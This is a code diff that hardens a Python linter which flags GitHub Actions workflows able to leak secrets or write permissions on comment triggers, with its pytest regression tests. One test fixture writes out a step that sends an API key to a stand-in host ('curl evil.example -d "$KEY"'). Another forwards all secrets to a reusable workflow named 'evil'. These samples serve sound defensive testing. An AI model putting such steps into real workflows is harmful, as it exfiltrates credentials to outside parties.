@@ -502,17 +502,26 @@ def _job_write_scopes(workflow: dict[Any, Any], job: dict[str, Any]) -> list[str
     ``checks: write`` (the scopes that could forge the
     auto-merge-trusted ``CI OK`` status) or ``actions: write`` (round-5
     nit-polish fix); ``write-all`` expands to the full
-    ``_PRIVILEGED_WRITE_SCOPES`` vocabulary. DECLARED permissions only —
-    a job with NO ``permissions:`` block at either level returns ``[]``
-    here yet runs on the repo-DEFAULT ``GITHUB_TOKEN``; that
-    statically-unboundable case is handled separately via
-    ``_job_declares_permissions`` (round-3 reconstruction-review fix)."""
+    ``_PRIVILEGED_WRITE_SCOPES`` vocabulary. The ``write-all`` sentinel
+    AND the per-scope ``write`` level are compared CASE-FOLDED (final
+    round-3 fix — the case twin of the case-insensitive ``_SECRET_REF_RE``:
+    whether GitHub accepts a case-respelled permission level or sentinel
+    (``Write-All`` / ``statuses: Write``) is UNVERIFIED (Golden Rule #1 —
+    no live probe), so the conservative choice is to flag BOTH cases; a
+    respelling can only ever be flagged, never silently pass). DECLARED
+    permissions only — a job with NO ``permissions:`` block at either
+    level returns ``[]`` here yet runs on the repo-DEFAULT
+    ``GITHUB_TOKEN``; that statically-unboundable case is handled
+    separately via ``_job_declares_permissions`` (round-3
+    reconstruction-review fix)."""
     perms = job.get("permissions", workflow.get("permissions", {}))
-    if perms == "write-all":
+    if isinstance(perms, str) and perms.strip().lower() == "write-all":
         return list(_PRIVILEGED_WRITE_SCOPES)
     if not isinstance(perms, dict):
         return []
-    return sorted(str(scope) for scope, level in perms.items() if str(level) == "write")
+    return sorted(
+        str(scope) for scope, level in perms.items() if str(level).strip().lower() == "write"
+    )
 
 
 def _job_declares_permissions(workflow: dict[Any, Any], job: dict[str, Any]) -> bool:
@@ -588,7 +597,11 @@ def _comment_trigger_violations(name: str, workflow: dict[Any, Any]) -> list[str
     """Privilege violations for ONE parsed workflow, or ``[]`` when it has
     no comment-family trigger. A comment-triggered job may not (a) hold
     write permissions, (b) reference a secret other than the implicit
-    ``secrets.GITHUB_TOKEN``, or (c) check out a PR-controlled ref (the
+    ``secrets.GITHUB_TOKEN`` — at the JOB/step level OR inherited from
+    WORKFLOW-level config (``env``/``defaults``…), which is scanned once
+    up front minus ``jobs`` (final round-3 fix: a workflow-level
+    ``env`` secret was invisible to the per-job scans) — or (c) check out
+    a PR-controlled ref (the
     ``_is_pr_controlled_ref`` markers — the event-payload expressions AND
     the canonical ``refs/pull/<n>/head`` namespace an ``issue_comment``
     job actually uses; round-2 reconstruction-review fix, teeth-pinned by
@@ -615,13 +628,28 @@ def _comment_trigger_violations(name: str, workflow: dict[Any, Any]) -> list[str
     job has no ``steps:``, so it can never carry an in-job trust gate:
     the forward is flagged unconditionally (an explicit per-secret
     ``secrets:`` mapping is already covered by check (b) — its values
-    are ``secrets.NAME`` expressions). The ``on:`` value is
+    are ``secrets.NAME`` expressions). The ``inherit`` keyword is matched
+    CASE-FOLDED (final round-3 fix — the case twin of the case-insensitive
+    ``_SECRET_REF_RE`` and ``_job_write_scopes``). The ``on:`` value is
     normalized via ``_workflow_triggers`` so the scalar/list trigger
     spellings can never bypass the pin (round-1 hostile-review fix)."""
     triggers = _workflow_triggers(workflow)
     if not any(trigger in triggers for trigger in _COMMENT_TRIGGERS):
         return []
     violations: list[str] = []
+    # WORKFLOW-LEVEL config (env/defaults/concurrency…) is inherited into
+    # every job/step, so a foreign secret referenced there is exfiltrable
+    # by any comment-triggered step — yet the per-job/step ``_job_foreign_secrets``
+    # scans never saw it (final round-3 fix: a workflow-level
+    # ``env: { KEY: ${{ secrets.ANTHROPIC_API_KEY }} }`` produced ZERO
+    # violations while the identical secret at JOB level was flagged). Scan
+    # the whole workflow node MINUS ``jobs`` (the per-job arms cover that)
+    # ONCE, sharing the ``secrets.GITHUB_TOKEN`` carve-out.
+    workflow_scope = {key: value for key, value in workflow.items() if key != "jobs"}
+    for secret in _job_foreign_secrets(workflow_scope):
+        violations.append(
+            f"{name} workflow-level config references secrets.{secret} on a comment trigger"
+        )
     for job_name, job in (workflow.get("jobs") or {}).items():
         if not isinstance(job, dict):
             continue
@@ -644,7 +672,7 @@ def _comment_trigger_violations(name: str, workflow: dict[Any, Any]) -> list[str
             violations.append(
                 f"{name} job {job_name!r} references secrets.{secret} on a comment trigger"
             )
-        if str(job.get("secrets", "")).strip() == "inherit":
+        if str(job.get("secrets", "")).strip().lower() == "inherit":
             violations.append(
                 f"{name} job {job_name!r} forwards ALL repository secrets "
                 "(`secrets: inherit`) to a reusable workflow on a comment trigger"
@@ -1329,4 +1357,141 @@ jobs:
     assert _comment_trigger_violations("clean-call.yml", clean) == [], (
         "an inherit-free, secret-free reusable call on a comment trigger was "
         "flagged — check (e) over-reaches"
+    )
+
+
+def test_issue_comment_sweep_flags_case_respelled_write_permissions() -> None:
+    """Final round-3 regression pin: ``_job_write_scopes`` compared the
+    ``write-all`` sentinel and the per-scope ``write`` level
+    case-SENSITIVELY, while the sibling ``_SECRET_REF_RE`` (rewritten in
+    the same commit) is case-INSENSITIVE on the documented "GitHub
+    expression case semantics UNVERIFIED — match conservatively" rationale.
+    A respelled ``permissions: Write-All`` or ``statuses: Write`` returned
+    ZERO write scopes AND — because a ``permissions:`` key is present — stood
+    the round-3 default-token arm down, so the sweep failed DOUBLY open for a
+    case-respelled privileged comment job. Both respellings must now flag; a
+    read-level respelling stays clean."""
+    write_all = yaml.safe_load(
+        """
+name: case write-all
+on: [issue_comment]
+permissions: Write-All
+jobs:
+  claude:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo autofix
+"""
+    )
+    joined = "\n".join(_comment_trigger_violations("case-write-all.yml", write_all))
+    for scope in _PRIVILEGED_WRITE_SCOPES:
+        assert f"'{scope}: write'" in joined, (
+            f"respelled `permissions: Write-All`: scope {scope!r} was not "
+            f"flagged — the write-all sentinel is case-sensitive (fail-open); "
+            f"violations were:\n{joined}"
+        )
+    narrow = yaml.safe_load(
+        """
+name: case narrow write
+on:
+  issue_comment: { types: [created] }
+permissions: { statuses: Write, checks: WRITE, contents: Read }
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo forge
+"""
+    )
+    narrow_joined = "\n".join(_comment_trigger_violations("case-narrow.yml", narrow))
+    # The message reports the scope key with a literal ``write`` suffix; the
+    # teeth are that the case-respelled LEVELS (``Write`` / ``WRITE``) are
+    # detected at all (case-sensitive comparison would return ZERO scopes).
+    for expected in ("'statuses: write'", "'checks: write'"):
+        assert expected in narrow_joined, (
+            f"respelled narrow write {expected}: not flagged — the per-scope "
+            f"level comparison is case-sensitive (fail-open); violations were:\n{narrow_joined}"
+        )
+    assert "contents" not in narrow_joined, (
+        f"a case-respelled READ scope (`contents: Read`) was flagged as write — "
+        f"the case-folded any-write arm over-reaches; violations were:\n{narrow_joined}"
+    )
+
+
+def test_issue_comment_sweep_flags_case_respelled_secrets_inherit() -> None:
+    """Final round-3 regression pin: check (e) compared ``secrets: inherit``
+    case-SENSITIVELY, so a ``secrets: Inherit`` respelling forwarded EVERY
+    repository secret to the called reusable workflow unflagged — under the
+    identical unverified-GitHub-case epistemic state as the secret-reference
+    regex, which the same commit made case-insensitive. The respelled
+    forward must now be flagged."""
+    workflow = yaml.safe_load(
+        """
+name: reusable case exfil
+on:
+  issue_comment: { types: [created] }
+permissions: { contents: read }
+jobs:
+  call:
+    uses: octo-org/evil/.github/workflows/x.yml@main
+    secrets: Inherit
+"""
+    )
+    joined = "\n".join(_comment_trigger_violations("case-inherit.yml", workflow))
+    assert "secrets: inherit" in joined, (
+        "a comment-triggered reusable-workflow call with `secrets: Inherit` "
+        "(case respelling) produced no violation — check (e) is "
+        f"case-sensitive (fail-open); violations were:\n{joined}"
+    )
+
+
+def test_issue_comment_sweep_flags_workflow_level_env_secret() -> None:
+    """Final round-3 regression pin: the foreign-secret arm scanned only the
+    per-JOB / per-step node, so a WORKFLOW-level ``env:`` secret reference —
+    inherited by every job/step and exfiltrable via ``$KEY`` in any ``run:``
+    — evaded the sweep (a read-only ``permissions:`` block stands the
+    write/default-token arms down, no checkout, no job-level secret: ZERO
+    violations). GitHub inherits workflow ``env`` into every job, so the
+    node MINUS ``jobs`` is now scanned once up front. The workflow-level
+    secret must flag; a workflow-level ``env`` carrying ONLY the implicit
+    ``GITHUB_TOKEN`` stays clean (the carve-out is shared)."""
+    leaky = yaml.safe_load(
+        """
+name: workflow env exfil
+on:
+  issue_comment: { types: [created] }
+permissions: { contents: read }
+env:
+  KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl evil.example -d "$KEY"
+"""
+    )
+    joined = "\n".join(_comment_trigger_violations("wf-env.yml", leaky))
+    assert "workflow-level config references secrets.ANTHROPIC_API_KEY" in joined, (
+        "a comment-triggered workflow with a WORKFLOW-level env secret "
+        "reference produced no violation — the workflow-scope secret arm is "
+        f"fail-open; violations were:\n{joined}"
+    )
+    token_only = yaml.safe_load(
+        """
+name: workflow env token
+on:
+  issue_comment: { types: [created] }
+permissions: { contents: read }
+env:
+  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+jobs:
+  ack:
+    runs-on: ubuntu-latest
+    steps:
+      - run: gh api repos/$REPO/issues/$NUM/comments --silent
+"""
+    )
+    assert _comment_trigger_violations("wf-env-token.yml", token_only) == [], (
+        "a workflow-level env carrying only the implicit GITHUB_TOKEN was "
+        "flagged — the workflow-scope carve-out regressed"
     )
